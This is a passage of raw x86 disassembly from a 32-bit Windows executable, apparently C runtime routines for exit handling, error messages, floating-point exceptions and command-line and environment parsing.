  432c41:	push   eax
  432c42:	call   DWORD PTR ds:0x439068
  432c48:	test   eax,eax
  432c4a:	jne    0x432c56
  432c4c:	call   DWORD PTR ds:0x4390ac
  432c52:	mov    edi,eax
  432c54:	jmp    0x432c58
  432c56:	xor    edi,edi
  432c58:	push   esi
  432c59:	call   0x436739
  432c5e:	mov    eax,esi
  432c60:	sar    eax,0x5
  432c63:	mov    eax,DWORD PTR [eax*4+0x465100]
  432c6a:	and    esi,0x1f
  432c6d:	test   edi,edi
  432c6f:	pop    ecx
  432c70:	lea    ecx,[esi+esi*8]
  432c73:	mov    BYTE PTR [eax+ecx*4+0x4],0x0
  432c78:	je     0x432c86
  432c7a:	push   edi
  432c7b:	call   0x43288a
  432c80:	pop    ecx
  432c81:	or     eax,0xffffffff
  432c84:	jmp    0x432c88
  432c86:	xor    eax,eax
  432c88:	pop    edi
  432c89:	pop    esi
  432c8a:	ret    
  432c8b:	push   0xc
  432c8d:	push   0x439d08
  432c92:	call   0x431210
  432c97:	mov    ebx,DWORD PTR [ebp+0x8]
  432c9a:	cmp    ebx,DWORD PTR ds:0x4650ec
  432ca0:	jae    0x432d0a
  432ca2:	mov    eax,ebx
  432ca4:	sar    eax,0x5
  432ca7:	lea    edi,[eax*4+0x465100]
  432cae:	mov    eax,ebx
  432cb0:	and    eax,0x1f
  432cb3:	lea    esi,[eax+eax*8]
  432cb6:	shl    esi,0x2
  432cb9:	mov    eax,DWORD PTR [edi]
  432cbb:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432cc0:	je     0x432d0a
  432cc2:	push   ebx
  432cc3:	call   0x4367f9
  432cc8:	pop    ecx
  432cc9:	and    DWORD PTR [ebp-0x4],0x0
  432ccd:	mov    eax,DWORD PTR [edi]
  432ccf:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432cd4:	je     0x432ce2
  432cd6:	push   ebx
  432cd7:	call   0x432c08
  432cdc:	pop    ecx
  432cdd:	mov    DWORD PTR [ebp-0x1c],eax
  432ce0:	jmp    0x432cf1
  432ce2:	call   0x432878
  432ce7:	mov    DWORD PTR [eax],0x9
  432ced:	or     DWORD PTR [ebp-0x1c],0xffffffff
  432cf1:	or     DWORD PTR [ebp-0x4],0xffffffff
  432cf5:	call   0x432d02
  432cfa:	mov    eax,DWORD PTR [ebp-0x1c]
  432cfd:	jmp    0x432d20
  432cff:	mov    ebx,DWORD PTR [ebp+0x8]
  432d02:	push   ebx
  432d03:	call   0x436899
  432d08:	pop    ecx
  432d09:	ret    
  432d0a:	call   0x432878
  432d0f:	mov    DWORD PTR [eax],0x9
  432d15:	call   0x432881
  432d1a:	and    DWORD PTR [eax],0x0
  432d1d:	or     eax,0xffffffff
  432d20:	call   0x43124b
  432d25:	ret    
  432d26:	push   0x439d24
  432d2b:	call   DWORD PTR ds:0x43905c
  432d31:	test   eax,eax
  432d33:	je     0x432d4b
  432d35:	push   0x439d14
  432d3a:	push   eax
  432d3b:	call   DWORD PTR ds:0x4390c8
  432d41:	test   eax,eax
  432d43:	je     0x432d4b
  432d45:	push   DWORD PTR [esp+0x4]
  432d49:	call   eax
  432d4b:	push   DWORD PTR [esp+0x4]
  432d4f:	call   DWORD PTR ds:0x43909c
  432d55:	int3   
  432d56:	push   0x8
  432d58:	call   0x431126
  432d5d:	pop    ecx
  432d5e:	ret    
  432d5f:	push   0x8
  432d61:	call   0x431071
  432d66:	pop    ecx
  432d67:	ret    
  432d68:	push   esi
  432d69:	mov    esi,eax
  432d6b:	jmp    0x432d78
  432d6d:	mov    eax,DWORD PTR [esi]
  432d6f:	test   eax,eax
  432d71:	je     0x432d75
  432d73:	call   eax
  432d75:	add    esi,0x4
  432d78:	cmp    esi,DWORD PTR [esp+0x8]
  432d7c:	jb     0x432d6d
  432d7e:	pop    esi
  432d7f:	ret    
  432d80:	mov    eax,ds:0x465210
  432d85:	test   eax,eax
  432d87:	je     0x432d90
  432d89:	push   DWORD PTR [esp+0x4]
  432d8d:	call   eax
  432d8f:	pop    ecx
  432d90:	push   esi
  432d91:	push   edi
  432d92:	mov    ecx,0x43d04c
  432d97:	mov    edi,0x43d060
  432d9c:	xor    eax,eax
  432d9e:	cmp    ecx,edi
  432da0:	mov    esi,ecx
  432da2:	jae    0x432dbb
  432da4:	test   eax,eax
  432da6:	jne    0x432de7
  432da8:	mov    ecx,DWORD PTR [esi]
  432daa:	test   ecx,ecx
  432dac:	je     0x432db0
  432dae:	call   ecx
  432db0:	add    esi,0x4
  432db3:	cmp    esi,edi
  432db5:	jb     0x432da4
  432db7:	test   eax,eax
  432db9:	jne    0x432de7
  432dbb:	push   0x433897
  432dc0:	call   0x42f2e0
  432dc5:	mov    esi,0x43d000
  432dca:	mov    eax,esi
  432dcc:	mov    edi,0x43d048
  432dd1:	cmp    eax,edi
  432dd3:	pop    ecx
  432dd4:	jae    0x432de5
  432dd6:	mov    eax,DWORD PTR [esi]
  432dd8:	test   eax,eax
  432dda:	je     0x432dde
  432ddc:	call   eax
  432dde:	add    esi,0x4
  432de1:	cmp    esi,edi
  432de3:	jb     0x432dd6
  432de5:	xor    eax,eax
  432de7:	pop    edi
  432de8:	pop    esi
  432de9:	ret    
  432dea:	push   0x8
  432dec:	push   0x439d30
  432df1:	call   0x431210
  432df6:	push   0x8
  432df8:	call   0x431126
  432dfd:	pop    ecx
  432dfe:	xor    edi,edi
  432e00:	mov    DWORD PTR [ebp-0x4],edi
  432e03:	xor    esi,esi
  432e05:	inc    esi
  432e06:	cmp    DWORD PTR ds:0x43fcf0,esi
  432e0c:	jne    0x432e1e
  432e0e:	push   DWORD PTR [ebp+0x8]
  432e11:	call   DWORD PTR ds:0x4390d0
  432e17:	push   eax
  432e18:	call   DWORD PTR ds:0x4390cc
  432e1e:	mov    DWORD PTR ds:0x43fcec,esi
  432e24:	mov    al,BYTE PTR [ebp+0x10]
  432e27:	mov    ds:0x43fce8,al
  432e2c:	cmp    DWORD PTR [ebp+0xc],edi
  432e2f:	jne    0x432e68
  432e31:	cmp    DWORD PTR ds:0x465208,edi
  432e37:	je     0x432e58
  432e39:	mov    eax,ds:0x465204
  432e3e:	sub    eax,0x4
  432e41:	mov    ds:0x465204,eax
  432e46:	cmp    eax,DWORD PTR ds:0x465208
  432e4c:	jb     0x432e58
  432e4e:	mov    eax,DWORD PTR [eax]
  432e50:	cmp    eax,edi
  432e52:	je     0x432e39
  432e54:	call   eax
  432e56:	jmp    0x432e39
  432e58:	push   0x43d06c
  432e5d:	mov    eax,0x43d064
  432e62:	call   0x432d68
  432e67:	pop    ecx
  432e68:	push   0x43d078
  432e6d:	mov    eax,0x43d070
  432e72:	call   0x432d68
  432e77:	pop    ecx
  432e78:	or     DWORD PTR [ebp-0x4],0xffffffff
  432e7c:	call   0x432e99
  432e81:	cmp    DWORD PTR [ebp+0x10],edi
  432e84:	jne    0x432ea7
  432e86:	mov    DWORD PTR ds:0x43fcf0,esi
  432e8c:	push   DWORD PTR [ebp+0x8]
  432e8f:	call   0x432d26
  432e94:	xor    edi,edi
  432e96:	xor    esi,esi
  432e98:	inc    esi
  432e99:	cmp    DWORD PTR [ebp+0x10],edi
  432e9c:	je     0x432ea6
  432e9e:	push   0x8
  432ea0:	call   0x431071
  432ea5:	pop    ecx
  432ea6:	ret    
  432ea7:	call   0x43124b
  432eac:	ret    
  432ead:	push   0x0
  432eaf:	push   0x0
  432eb1:	push   DWORD PTR [esp+0xc]
  432eb5:	call   0x432dea
  432eba:	add    esp,0xc
  432ebd:	ret    
  432ebe:	push   0x0
  432ec0:	push   0x1
  432ec2:	push   DWORD PTR [esp+0xc]
  432ec6:	call   0x432dea
  432ecb:	add    esp,0xc
  432ece:	ret    
  432ecf:	push   0x1
  432ed1:	push   0x0
  432ed3:	push   0x0
  432ed5:	call   0x432dea
  432eda:	add    esp,0xc
  432edd:	ret    
  432ede:	push   0x1
  432ee0:	push   0x1
  432ee2:	push   0x0
  432ee4:	call   0x432dea
  432ee9:	add    esp,0xc
  432eec:	ret    
  432eed:	push   ebp
  432eee:	lea    ebp,[esp-0x8c]
  432ef5:	sub    esp,0x10c
  432efb:	mov    eax,ds:0x43d404
  432f00:	mov    ecx,DWORD PTR [ebp+0x94]
  432f06:	push   ebx
  432f07:	push   esi
  432f08:	mov    DWORD PTR [ebp+0x88],eax
  432f0e:	xor    edx,edx
  432f10:	push   edi
  432f11:	xor    eax,eax
  432f13:	cmp    ecx,DWORD PTR [eax*8+0x43db20]
  432f1a:	je     0x432f22
  432f1c:	inc    eax
  432f1d:	cmp    eax,0x13
  432f20:	jb     0x432f13
  432f22:	mov    esi,eax
  432f24:	shl    esi,0x3
  432f27:	cmp    ecx,DWORD PTR [esi+0x43db20]
  432f2d:	jne    0x433048
  432f33:	mov    eax,ds:0x43fb40
  432f38:	cmp    eax,0x1
  432f3b:	je     0x433020
  432f41:	cmp    eax,edx
  432f43:	jne    0x432f52
  432f45:	cmp    DWORD PTR ds:0x43d3ec,0x1
  432f4c:	je     0x433020
  432f52:	cmp    ecx,0xfc
  432f58:	je     0x433048
  432f5e:	push   0x104
  432f63:	lea    eax,[ebp-0x80]
  432f66:	push   eax
  432f67:	push   edx
  432f68:	mov    BYTE PTR [ebp+0x84],dl
  432f6e:	call   DWORD PTR ds:0x4390d8
  432f74:	test   eax,eax
  432f76:	jne    0x432f88
  432f78:	lea    eax,[ebp-0x80]
  432f7b:	push   0x43a12c
  432f80:	push   eax
  432f81:	call   0x432780
  432f86:	pop    ecx
  432f87:	pop    ecx
  432f88:	lea    edi,[ebp-0x80]
  432f8b:	mov    eax,edi
  432f8d:	push   eax
  432f8e:	call   0x42e160
  432f93:	inc    eax
  432f94:	cmp    eax,0x3c
  432f97:	pop    ecx
  432f98:	jbe    0x432fbc
  432f9a:	mov    eax,edi
  432f9c:	push   eax
  432f9d:	call   0x42e160
  432fa2:	mov    edi,eax
  432fa4:	lea    eax,[ebp-0x80]
  432fa7:	sub    eax,0x3b
  432faa:	push   0x3
  432fac:	add    edi,eax
  432fae:	push   0x43a128
  432fb3:	push   edi
  432fb4:	call   0x434d20
  432fb9:	add    esp,0x10
  432fbc:	push   edi
  432fbd:	call   0x42e160
  432fc2:	push   DWORD PTR [esi+0x43db24]
  432fc8:	mov    ebx,eax
  432fca:	call   0x42e160
  432fcf:	lea    eax,[ebx+eax*1+0x1c]
  432fd3:	pop    ecx
  432fd4:	add    eax,0x3
  432fd7:	pop    ecx
  432fd8:	and    eax,0xfffffffc
  432fdb:	call   0x433bb0
  432fe0:	mov    ebx,esp
  432fe2:	push   0x43a10c
  432fe7:	push   ebx
  432fe8:	call   0x432780
  432fed:	push   edi
  432fee:	push   ebx
  432fef:	call   0x432790
  432ff4:	push   0x43a108
  432ff9:	push   ebx
  432ffa:	call   0x432790
  432fff:	push   DWORD PTR [esi+0x43db24]
  433005:	push   ebx
  433006:	call   0x432790
  43300b:	push   0x12010
  433010:	push   0x43a0e0
  433015:	push   ebx
  433016:	call   0x436cbd
  43301b:	add    esp,0x2c
  43301e:	jmp    0x433048
  433020:	push   edx
  433021:	lea    eax,[ebp+0x94]
  433027:	push   eax
  433028:	lea    esi,[esi+0x43db24]
  43302e:	push   DWORD PTR [esi]
  433030:	call   0x42e160
  433035:	pop    ecx
  433036:	push   eax
  433037:	push   DWORD PTR [esi]
  433039:	push   0xfffffff4
  43303b:	call   DWORD PTR ds:0x4390d4
  433041:	push   eax
  433042:	call   DWORD PTR ds:0x4390bc
  433048:	lea    esp,[ebp-0x8c]
  43304e:	mov    ecx,DWORD PTR [ebp+0x88]
  433054:	call   0x42f1f2
  433059:	pop    edi
  43305a:	pop    esi
  43305b:	pop    ebx
  43305c:	add    ebp,0x8c
  433062:	leave  
  433063:	ret    
  433064:	mov    eax,ds:0x43fb40
  433069:	cmp    eax,0x1
  43306c:	je     0x43307b
  43306e:	test   eax,eax
  433070:	jne    0x43309c
  433072:	cmp    DWORD PTR ds:0x43d3ec,0x1
  433079:	jne    0x43309c
  43307b:	push   0xfc
  433080:	call   0x432eed
  433085:	mov    eax,ds:0x43fcf4
  43308a:	test   eax,eax
  43308c:	pop    ecx
  43308d:	je     0x433091
  43308f:	call   eax
  433091:	push   0xff
  433096:	call   0x432eed
  43309b:	pop    ecx
  43309c:	ret    
  43309d:	push   ebp
  43309e:	mov    ebp,esp
  4330a0:	push   ecx
  4330a1:	push   ebx
  4330a2:	push   esi
  4330a3:	push   edi
  4330a4:	call   0x433901
  4330a9:	mov    edi,DWORD PTR [ebp+0x8]
  4330ac:	mov    esi,eax
  4330ae:	mov    edx,DWORD PTR [esi+0x54]
  4330b1:	mov    eax,ds:0x43dc3c
  4330b6:	mov    ecx,edx
  4330b8:	cmp    DWORD PTR [ecx],edi
  4330ba:	je     0x4330c9
  4330bc:	lea    ebx,[eax+eax*2]
  4330bf:	add    ecx,0xc
  4330c2:	lea    ebx,[edx+ebx*4]
  4330c5:	cmp    ecx,ebx
  4330c7:	jb     0x4330b8
  4330c9:	lea    eax,[eax+eax*2]
  4330cc:	lea    eax,[edx+eax*4]
  4330cf:	cmp    ecx,eax
  4330d1:	jae    0x4330d7
  4330d3:	cmp    DWORD PTR [ecx],edi
  4330d5:	je     0x4330d9
  4330d7:	xor    ecx,ecx
  4330d9:	test   ecx,ecx
  4330db:	je     0x4331f3
  4330e1:	mov    ebx,DWORD PTR [ecx+0x8]
  4330e4:	test   ebx,ebx
  4330e6:	mov    DWORD PTR [ebp+0x8],ebx
  4330e9:	je     0x4331f3
  4330ef:	cmp    ebx,0x5
  4330f2:	jne    0x433100
  4330f4:	and    DWORD PTR [ecx+0x8],0x0
  4330f8:	xor    eax,eax
  4330fa:	inc    eax
  4330fb:	jmp    0x4331fc
  433100:	cmp    ebx,0x1
  433103:	je     0x4331ee
  433109:	mov    eax,DWORD PTR [esi+0x58]
  43310c:	mov    DWORD PTR [ebp-0x4],eax
  43310f:	mov    eax,DWORD PTR [ebp+0xc]
  433112:	mov    DWORD PTR [esi+0x58],eax
  433115:	mov    eax,DWORD PTR [ecx+0x4]
  433118:	cmp    eax,0x8
  43311b:	jne    0x4331e0
  433121:	mov    edx,DWORD PTR ds:0x43dc30
  433127:	mov    eax,ds:0x43dc34
  43312c:	add    eax,edx
  43312e:	cmp    edx,eax
  433130:	jge    0x433159
  433132:	lea    eax,[edx+edx*2]
  433135:	shl    eax,0x2
  433138:	mov    edi,DWORD PTR [esi+0x54]
  43313b:	and    DWORD PTR [eax+edi*1+0x8],0x0
  433140:	mov    edi,DWORD PTR ds:0x43dc30
  433146:	mov    ebx,DWORD PTR ds:0x43dc34
  43314c:	inc    edx
  43314d:	add    ebx,edi
  43314f:	add    eax,0xc
  433152:	cmp    edx,ebx
  433154:	jl     0x433138
  433156:	mov    ebx,DWORD PTR [ebp+0x8]
  433159:	mov    ecx,DWORD PTR [ecx]
  43315b:	cmp    ecx,0xc000008e
  433161:	mov    edi,DWORD PTR [esi+0x5c]
  433164:	jne    0x43316f
  433166:	mov    DWORD PTR [esi+0x5c],0x83
  43316d:	jmp    0x4331d3
  43316f:	cmp    ecx,0xc0000090
  433175:	jne    0x433180
  433177:	mov    DWORD PTR [esi+0x5c],0x81
  43317e:	jmp    0x4331d3
  433180:	cmp    ecx,0xc0000091
  433186:	jne    0x433191
  433188:	mov    DWORD PTR [esi+0x5c],0x84
  43318f:	jmp    0x4331d3
  433191:	cmp    ecx,0xc0000093
  433197:	jne    0x4331a2
  433199:	mov    DWORD PTR [esi+0x5c],0x85
  4331a0:	jmp    0x4331d3
  4331a2:	cmp    ecx,0xc000008d
  4331a8:	jne    0x4331b3
  4331aa:	mov    DWORD PTR [esi+0x5c],0x82
  4331b1:	jmp    0x4331d3
  4331b3:	cmp    ecx,0xc000008f
  4331b9:	jne    0x4331c4
  4331bb:	mov    DWORD PTR [esi+0x5c],0x86
  4331c2:	jmp    0x4331d3
  4331c4:	cmp    ecx,0xc0000092
  4331ca:	jne    0x4331d3
  4331cc:	mov    DWORD PTR [esi+0x5c],0x8a
  4331d3:	push   DWORD PTR [esi+0x5c]
  4331d6:	push   0x8
  4331d8:	call   ebx
  4331da:	pop    ecx
  4331db:	mov    DWORD PTR [esi+0x5c],edi
  4331de:	jmp    0x4331e7
  4331e0:	and    DWORD PTR [ecx+0x8],0x0
  4331e4:	push   eax
  4331e5:	call   ebx
  4331e7:	mov    eax,DWORD PTR [ebp-0x4]
  4331ea:	pop    ecx
  4331eb:	mov    DWORD PTR [esi+0x58],eax
  4331ee:	or     eax,0xffffffff
  4331f1:	jmp    0x4331fc
  4331f3:	push   DWORD PTR [ebp+0xc]
  4331f6:	call   DWORD PTR ds:0x4390dc
  4331fc:	pop    edi
  4331fd:	pop    esi
  4331fe:	pop    ebx
  4331ff:	leave  
  433200:	ret    
  433201:	push   esi
  433202:	push   edi
  433203:	xor    edi,edi
  433205:	cmp    DWORD PTR ds:0x46520c,edi
  43320b:	jne    0x433212
  43320d:	call   0x4372be
  433212:	mov    esi,DWORD PTR ds:0x466264
  433218:	test   esi,esi
  43321a:	jne    0x433221
  43321c:	mov    esi,0x4396f2
  433221:	mov    al,BYTE PTR [esi]
  433223:	cmp    al,0x20
  433225:	ja     0x43322f
  433227:	test   al,al
  433229:	je     0x433259
  43322b:	test   edi,edi
  43322d:	je     0x433253
  43322f:	cmp    al,0x22
  433231:	jne    0x43323c
  433233:	xor    ecx,ecx
  433235:	test   edi,edi
  433237:	sete   cl
  43323a:	mov    edi,ecx
  43323c:	movzx  eax,al
  43323f:	push   eax
  433240:	call   0x436de9
  433245:	test   eax,eax
  433247:	pop    ecx
  433248:	je     0x43324b
  43324a:	inc    esi
  43324b:	inc    esi
  43324c:	jmp    0x433221
  43324e:	cmp    al,0x20
  433250:	ja     0x433259
  433252:	inc    esi
  433253:	mov    al,BYTE PTR [esi]
  433255:	test   al,al
  433257:	jne    0x43324e
  433259:	pop    edi
  43325a:	mov    eax,esi
  43325c:	pop    esi
  43325d:	ret    
  43325e:	push   ebx
  43325f:	xor    ebx,ebx
  433261:	cmp    DWORD PTR ds:0x46520c,ebx
  433267:	push   esi
  433268:	push   edi
  433269:	jne    0x433270
  43326b:	call   0x4372be
  433270:	mov    esi,DWORD PTR ds:0x43fb38
  433276:	xor    edi,edi
  433278:	cmp    esi,ebx
  43327a:	jne    0x43328e
  43327c:	jmp    0x4332ae
  43327e:	cmp    al,0x3d
  433280:	je     0x433283
  433282:	inc    edi
  433283:	push   esi
  433284:	call   0x42e160
  433289:	pop    ecx
  43328a:	lea    esi,[esi+eax*1+0x1]
  43328e:	mov    al,BYTE PTR [esi]
  433290:	cmp    al,bl
  433292:	jne    0x43327e
  433294:	lea    eax,[edi*4+0x4]
  43329b:	push   eax
  43329c:	call   0x4311fe
  4332a1:	mov    edi,eax
  4332a3:	cmp    edi,ebx
  4332a5:	pop    ecx
  4332a6:	mov    DWORD PTR ds:0x43fcd0,edi
  4332ac:	jne    0x4332b3
  4332ae:	or     eax,0xffffffff
  4332b1:	jmp    0x43330b
  4332b3:	mov    esi,DWORD PTR ds:0x43fb38
  4332b9:	push   ebp
  4332ba:	jmp    0x4332e6
  4332bc:	push   esi
  4332bd:	call   0x42e160
  4332c2:	mov    ebp,eax
  4332c4:	inc    ebp
  4332c5:	cmp    BYTE PTR [esi],0x3d
  4332c8:	pop    ecx
  4332c9:	je     0x4332e4
  4332cb:	push   ebp
  4332cc:	call   0x4311fe
  4332d1:	cmp    eax,ebx
  4332d3:	pop    ecx
  4332d4:	mov    DWORD PTR [edi],eax
  4332d6:	je     0x43330f
  4332d8:	push   esi
  4332d9:	push   eax
  4332da:	call   0x432780
  4332df:	pop    ecx
  4332e0:	pop    ecx
  4332e1:	add    edi,0x4
  4332e4:	add    esi,ebp
  4332e6:	cmp    BYTE PTR [esi],bl
  4332e8:	jne    0x4332bc
  4332ea:	push   DWORD PTR ds:0x43fb38
  4332f0:	call   0x42e0ed
  4332f5:	mov    DWORD PTR ds:0x43fb38,ebx
  4332fb:	mov    DWORD PTR [edi],ebx
  4332fd:	mov    DWORD PTR ds:0x465200,0x1
  433307:	xor    eax,eax
  433309:	pop    ecx
  43330a:	pop    ebp
  43330b:	pop    edi
  43330c:	pop    esi
  43330d:	pop    ebx
  43330e:	ret    
  43330f:	push   DWORD PTR ds:0x43fcd0
  433315:	call   0x42e0ed
  43331a:	mov    DWORD PTR ds:0x43fcd0,ebx
  433320:	or     eax,0xffffffff
  433323:	jmp    0x433309
  433325:	push   ebp
  433326:	mov    ebp,esp
  433328:	push   ecx
  433329:	push   ebx
  43332a:	mov    ebx,DWORD PTR [ebp+0xc]
  43332d:	xor    edx,edx
  43332f:	cmp    DWORD PTR [ebp+0x8],edx
  433332:	push   edi
  433333:	mov    DWORD PTR [esi],edx
  433335:	mov    edi,ecx
  433337:	mov    DWORD PTR [ebx],0x1
  43333d:	je     0x433348
  43333f:	mov    ecx,DWORD PTR [ebp+0x8]
  433342:	add    DWORD PTR [ebp+0x8],0x4
  433346:	mov    DWORD PTR [ecx],edi
  433348:	cmp    BYTE PTR [eax],0x22
  43334b:	jne    0x43335b
  43334d:	xor    ecx,ecx
  43334f:	test   edx,edx
  433351:	sete   cl
  433354:	inc    eax
  433355:	mov    edx,ecx
  433357:	mov    cl,0x22
  433359:	jmp    0x433388
  43335b:	inc    DWORD PTR [esi]
  43335d:	test   edi,edi
  43335f:	je     0x433366
  433361:	mov    cl,BYTE PTR [eax]
  433363:	mov    BYTE PTR [edi],cl
  433365:	inc    edi
  433366:	mov    cl,BYTE PTR [eax]
  433368:	movzx  ebx,cl
  43336b:	inc    eax
  43336c:	test   BYTE PTR [ebx+0x464ec1],0x4
  433373:	je     0x433381
  433375:	inc    DWORD PTR [esi]
  433377:	test   edi,edi
  433379:	je     0x433380
  43337b:	mov    bl,BYTE PTR [eax]
  43337d:	mov    BYTE PTR [edi],bl
  43337f:	inc    edi
  433380:	inc    eax
  433381:	test   cl,cl
  433383:	mov    ebx,DWORD PTR [ebp+0xc]
  433386:	je     0x4333ba
  433388:	test   edx,edx
  43338a:	jne    0x433348
  43338c:	cmp    cl,0x20
  43338f:	je     0x433396
  433391:	cmp    cl,0x9
  433394:	jne    0x433348
  433396:	test   edi,edi
  433398:	je     0x43339e
  43339a:	mov    BYTE PTR [edi-0x1],0x0
  43339e:	and    DWORD PTR [ebp-0x4],0x0
  4333a2:	cmp    BYTE PTR [eax],0x0
  4333a5:	je     0x433481
  4333ab:	mov    cl,BYTE PTR [eax]
  4333ad:	cmp    cl,0x20
  4333b0:	je     0x4333b7
  4333b2:	cmp    cl,0x9
  4333b5:	jne    0x4333bd
  4333b7:	inc    eax
  4333b8:	jmp    0x4333ab
  4333ba:	dec    eax
  4333bb:	jmp    0x43339e
  4333bd:	cmp    BYTE PTR [eax],0x0
  4333c0:	je     0x433481
  4333c6:	cmp    DWORD PTR [ebp+0x8],0x0
  4333ca:	je     0x4333d5
  4333cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4333cf:	add    DWORD PTR [ebp+0x8],0x4
  4333d3:	mov    DWORD PTR [ecx],edi
  4333d5:	inc    DWORD PTR [ebx]
  4333d7:	xor    ebx,ebx
  4333d9:	inc    ebx
  4333da:	xor    edx,edx
  4333dc:	jmp    0x4333e0
  4333de:	inc    eax
  4333df:	inc    edx
  4333e0:	cmp    BYTE PTR [eax],0x5c
  4333e3:	je     0x4333de
  4333e5:	cmp    BYTE PTR [eax],0x22
  4333e8:	jne    0x433410
  4333ea:	test   dl,0x1
  4333ed:	jne    0x43340e
  4333ef:	cmp    DWORD PTR [ebp-0x4],0x0
  4333f3:	je     0x433401
  4333f5:	lea    ecx,[eax+0x1]
  4333f8:	cmp    BYTE PTR [ecx],0x22
  4333fb:	jne    0x433401
  4333fd:	mov    eax,ecx
  4333ff:	jmp    0x433403
  433401:	xor    ebx,ebx
  433403:	xor    ecx,ecx
  433405:	cmp    DWORD PTR [ebp-0x4],ecx
  433408:	sete   cl
  43340b:	mov    DWORD PTR [ebp-0x4],ecx
  43340e:	shr    edx,1
  433410:	test   edx,edx
  433412:	je     0x433421
  433414:	test   edi,edi
  433416:	je     0x43341c
  433418:	mov    BYTE PTR [edi],0x5c
  43341b:	inc    edi
  43341c:	inc    DWORD PTR [esi]
  43341e:	dec    edx
  43341f:	jne    0x433414
  433421:	mov    cl,BYTE PTR [eax]
  433423:	test   cl,cl
  433425:	je     0x43346f
  433427:	cmp    DWORD PTR [ebp-0x4],0x0
  43342b:	jne    0x433437
  43342d:	cmp    cl,0x20
  433430:	je     0x43346f
  433432:	cmp    cl,0x9
  433435:	je     0x43346f
  433437:	test   ebx,ebx
  433439:	je     0x433469
  43343b:	test   edi,edi
  43343d:	je     0x433458
  43343f:	movzx  edx,cl
  433442:	test   BYTE PTR [edx+0x464ec1],0x4
  433449:	je     0x433451
  43344b:	mov    BYTE PTR [edi],cl
  43344d:	inc    edi
  43344e:	inc    eax
  43344f:	inc    DWORD PTR [esi]
  433451:	mov    cl,BYTE PTR [eax]
  433453:	mov    BYTE PTR [edi],cl
  433455:	inc    edi
  433456:	jmp    0x433467
  433458:	movzx  ecx,cl
  43345b:	test   BYTE PTR [ecx+0x464ec1],0x4
  433462:	je     0x433467
  433464:	inc    eax
  433465:	inc    DWORD PTR [esi]
  433467:	inc    DWORD PTR [esi]
  433469:	inc    eax
  43346a:	jmp    0x4333d7
  43346f:	test   edi,edi
  433471:	je     0x433477
  433473:	mov    BYTE PTR [edi],0x0
  433476:	inc    edi
  433477:	inc    DWORD PTR [esi]
  433479:	mov    ebx,DWORD PTR [ebp+0xc]
  43347c:	jmp    0x4333a2
  433481:	mov    eax,DWORD PTR [ebp+0x8]
  433484:	test   eax,eax
  433486:	je     0x43348b
  433488:	and    DWORD PTR [eax],0x0
  43348b:	inc    DWORD PTR [ebx]
  43348d:	pop    edi
  43348e:	pop    ebx
  43348f:	leave  
  433490:	ret    
  433491:	push   ebp
  433492:	mov    ebp,esp
  433494:	push   ecx
  433495:	push   ecx
  433496:	push   ebx
  433497:	push   esi
  433498:	push   edi
  433499:	xor    edi,edi
  43349b:	cmp    DWORD PTR ds:0x46520c,edi
  4334a1:	jne    0x4334a8
  4334a3:	call   0x4372be
  4334a8:	push   0x104
  4334ad:	mov    esi,0x43fcf8
  4334b2:	push   esi
  4334b3:	push   edi
  4334b4:	mov    BYTE PTR ds:0x43fdfc,0x0
  4334bb:	call   DWORD PTR ds:0x4390d8
  4334c1:	mov    eax,ds:0x466264
  4334c6:	cmp    eax,edi
  4334c8:	mov    DWORD PTR ds:0x43fce0,esi
  4334ce:	je     0x4334d7
  4334d0:	cmp    BYTE PTR [eax],0x0
  4334d3:	mov    ebx,eax
  4334d5:	jne    0x4334d9
  4334d7:	mov    ebx,esi
  4334d9:	lea    eax,[ebp-0x4]
  4334dc:	push   eax
  4334dd:	push   edi
  4334de:	lea    esi,[ebp-0x8]
  4334e1:	xor    ecx,ecx
  4334e3:	mov    eax,ebx
  4334e5:	call   0x433325
  4334ea:	mov    esi,DWORD PTR [ebp-0x4]
  4334ed:	mov    eax,DWORD PTR [ebp-0x8]
  4334f0:	shl    esi,0x2
  4334f3:	add    eax,esi
  4334f5:	push   eax
  4334f6:	call   0x4311fe
  4334fb:	mov    edi,eax
  4334fd:	add    esp,0xc
  433500:	test   edi,edi
  433502:	jne    0x433509
  433504:	or     eax,0xffffffff
  433507:	jmp    0x43352e
  433509:	lea    eax,[ebp-0x4]
  43350c:	push   eax
  43350d:	lea    ecx,[esi+edi*1]
  433510:	push   edi
  433511:	lea    esi,[ebp-0x8]
  433514:	mov    eax,ebx
  433516:	call   0x433325
  43351b:	mov    eax,DWORD PTR [ebp-0x4]
  43351e:	dec    eax
  43351f:	pop    ecx
  433520:	mov    ds:0x43fcc4,eax
  433525:	pop    ecx
  433526:	mov    DWORD PTR ds:0x43fcc8,edi
  43352c:	xor    eax,eax
  43352e:	pop    edi
  43352f:	pop    esi
  433530:	pop    ebx
  433531:	leave  
  433532:	ret    
  433533:	push   ecx
  433534:	push   ecx
  433535:	mov    eax,ds:0x43fe00
  43353a:	push   ebx
  43353b:	push   ebp
  43353c:	push   esi
  43353d:	push   edi
  43353e:	mov    edi,DWORD PTR ds:0x4390ec
  433544:	xor    ebx,ebx
  433546:	xor    esi,esi
  433548:	cmp    eax,ebx
  43354a:	push   0x2
  43354c:	pop    ebp
  43354d:	jne    0x43357c
  43354f:	call   edi
  433551:	mov    esi,eax
  433553:	cmp    esi,ebx
  433555:	je     0x433563
  433557:	mov    DWORD PTR ds:0x43fe00,0x1
  433561:	jmp    0x433581
  433563:	call   DWORD PTR ds:0x4390ac
  433569:	cmp    eax,0x78
  43356c:	jne    0x433577
  43356e:	mov    eax,ebp
  433570:	mov    ds:0x43fe00,eax
  433575:	jmp    0x43357c
  433577:	mov    eax,ds:0x43fe00
  43357c:	cmp    eax,0x1
  43357f:	jne    0x4335fe
  433581:	cmp    esi,ebx
  433583:	jne    0x43358d
  433585:	call   edi
  433587:	mov    esi,eax
  433589:	cmp    esi,ebx
  43358b:	je     0x433606
  43358d:	cmp    WORD PTR [esi],bx
  433590:	mov    eax,esi
  433592:	je     0x4335a2
  433594:	add    eax,ebp
  433596:	cmp    WORD PTR [eax],bx
  433599:	jne    0x433594
  43359b:	add    eax,ebp
  43359d:	cmp    WORD PTR [eax],bx
  4335a0:	jne    0x433594
  4335a2:	mov    edi,DWORD PTR ds:0x4390a4
  4335a8:	push   ebx
  4335a9:	push   ebx
  4335aa:	push   ebx
  4335ab:	sub    eax,esi
  4335ad:	push   ebx
  4335ae:	sar    eax,1
  4335b0:	inc    eax
  4335b1:	push   eax
  4335b2:	push   esi
  4335b3:	push   ebx
  4335b4:	push   ebx
